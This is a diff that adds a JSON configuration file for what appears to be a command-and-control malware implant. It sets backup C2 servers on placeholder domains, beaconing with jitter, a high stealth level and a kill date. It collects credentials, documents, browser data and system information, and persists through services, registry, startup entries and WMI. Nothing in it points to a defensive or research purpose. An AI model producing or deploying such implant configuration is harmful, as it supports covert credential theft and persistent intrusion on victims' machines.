@@ -1,0 +1,43 @@
+{
+    "c2_config": {
+        "primary_server": "https://cdn.yourdomain.com",
+        "backup_servers": [
+            "https://backup1.yourdomain.com",
+            "https://backup2.yourdomain.com"
+        ],
+        "dns_servers": [
+            "8.8.8.8",
+            "1.1.1.1"
+        ],
+        "onion_services": []
+    },
+    "agent_config": {
+        "beacon_interval": 3600,
+        "jitter": 0.3,
+        "max_retries": 3,
+        "timeout": 30,
+        "stealth_level": "high",
+        "kill_date": "2025-12-31",
+        "collect_types": [
+            "credentials",
+            "documents",
+            "browser",
+            "system"
+        ]
+    },
+    "persistence_config": {
+        "methods": [
+            "service",
+            "registry",
+            "startup",
+            "wmi"
+        ],
+        "backup_count": 3
+    },
+    "network_config": {
+        "scan_enabled": false,
+        "propagate": false,
+        "p2p_enabled": true,
+        "max_peers": 5
+    }
+}
